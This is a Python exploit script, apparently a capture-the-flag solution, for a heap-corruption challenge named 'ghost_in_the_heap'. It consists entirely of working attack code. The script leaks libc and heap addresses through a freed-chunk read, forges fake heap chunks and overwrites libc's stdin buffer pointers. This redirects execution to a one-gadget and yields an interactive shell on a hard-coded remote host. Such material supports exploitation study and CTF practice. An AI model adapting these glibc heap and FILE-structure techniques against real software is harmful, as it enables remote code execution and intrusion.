#!/usr/bin/env python
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './ghost_in_the_heap.bin'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False}, \
                        local   = {'argv':[bin_file]}, \
                        remote  = {'host':'52.193.196.17', 'port':56746})
env.set_item('libc',    debug   = None, \
                        local   = None, \
                        remote  = 'libc.so.6')
env.select()

#==========

binf = ELF(bin_file)
addr_plt_puts       = binf.plt['puts']
addr_got_main       = binf.got['__libc_start_main']
addr_bss            = binf.sep_section['.bss']

libc = ELF(env.libc) if env.libc else binf.libc

#==========

def attack(conn):
    gh = Ghost(conn)

    gh.new_h('a'*4)
    gh.new_h('b'*4)
    gh.delete_h(0)

    gh.add_g(0xcafebabe, '!')
    libc.address = u(gh.watch_g(0xcafebabe)) - 0x3c4c21
    addr_libc_stdin         = libc.symbols['_IO_2_1_stdin_']
    addr_libc_stdin_bufend  = addr_libc_stdin + 0x40
    addr_libc_lock0         = libc.address + 0x3c6790 # libc.symbols['_IO_stdfile_0_lock']
    addr_libc_io_jumps      = libc.symbols['_IO_file_jumps']
    addr_libc_one_rce       = libc.address + 0xf1117
    info('addr_libc_base    = 0x{:08x}'.format(libc.address))

    gh.delete_h(1)

    gh.new_h('a'*4)
    gh.new_h('b'*4)
    gh.new_h('c'*4)

    gh.remove_g()
    gh.delete_h(0)
    gh.delete_h(2)

    gh.new_h('A'*4)
    gh.new_h('C'*4)

    gh.delete_h(1)
    gh.new_h('B'*4)
    gh.delete_h(0)

    gh.add_g(0x11, 'a'*8+'!')
    addr_heap_base = u(gh.watch_g(0x11)[8:]) - 0x21
    info('addr_heap_base    = 0x{:08x}'.format(addr_heap_base))
   
    # reset
    gh.remove_g()
    gh.delete_h(1)
    gh.delete_h(2)

    gh.new_h('a'*4)
    gh.add_g(0xdeadbeef, '!')
    gh.new_h('b'*4)
    gh.new_h('c'*4)

    gh.remove_g()
    gh.delete_h(2)

    gh.new_h('C'*4)
    gh.delete_h(0)
    gh.delete_h(1)

    gh.new_h('A'*0x18+p64(addr_libc_one_rce)+'A'*0x88)
    gh.new_h('B'*4)

    gh.delete_h(0)
    gh.delete_h(1)

    fakechunk  = 'X'*0x40
    fakechunk += p64(0)
    fakechunk += p64(0x111)
    fakechunk += p64(addr_heap_base + 0xb0)
    fakechunk += p64(addr_heap_base + 0xb0)

    gh.add_g(0xdeadbeef, '!')
    gh.new_h(fakechunk)
    gh.new_h('D'*4)

    gh.delete_h(2)
    gh.delete_h(0)

    gh.new_h('0'*4)
    gh.new_h('2'*4)

    gh.delete_h(0)
    gh.delete_h(2)

    fakechunk  = 'Y'*0x40
    fakechunk += p64(0)
    fakechunk += p64(0xb1)
    fakechunk += p64(0)
    fakechunk += p64(addr_libc_stdin_bufend - 0x10)
    gh.new_h(fakechunk)

    exploit  = '\x00'*0x5
    exploit += p64(addr_libc_lock0)
    exploit += '\x00'*0x10
    exploit += p64(addr_heap_base)          # anyware
    exploit += '\x00'*0x18
    exploit += p64(1)
    exploit += '\x00'*(0x55-len(exploit))
    exploit += p64(addr_heap_base + 0x10)
    gh.new_h(exploit)

    gh.delete_h(0)

class Ghost:
    def __init__(self, conn):
        self.recvuntil      = conn.recvuntil
        self.recv           = conn.recv
        self.sendline       = conn.sendline
        self.send           = conn.send
        self.sendlineafter  = conn.sendlineafter
        self.sendafter      = conn.sendafter

    def new_h(self, data):
        self.sendafter('Your choice: ', '1')
        self.sendafter('Data :', data+('\n' if len(data)<0xa8 else ''))

    def delete_h(self, idx):
        self.sendafter('Your choice: ', '2')
        self.sendafter('Index :', str(idx))

    def add_g(self, magic, dsc):
        self.sendafter('Your choice: ', '3')
        self.sendafter('Magic :', str(magic))
        self.sendafter('Description :', dsc)

    def watch_g(self, magic):
        self.sendafter('Your choice: ', '4')
        self.sendafter('Magic :', str(magic))
        self.recvuntil('Description: ')
        return self.recvuntil('$', drop = True)

    def remove_g(self):
        self.sendafter('Your choice: ', '5')


#==========

if __name__=='__main__':
    conn = communicate(env.mode, **env.target)
    attack(conn)
    conn.interactive()
    
#==========
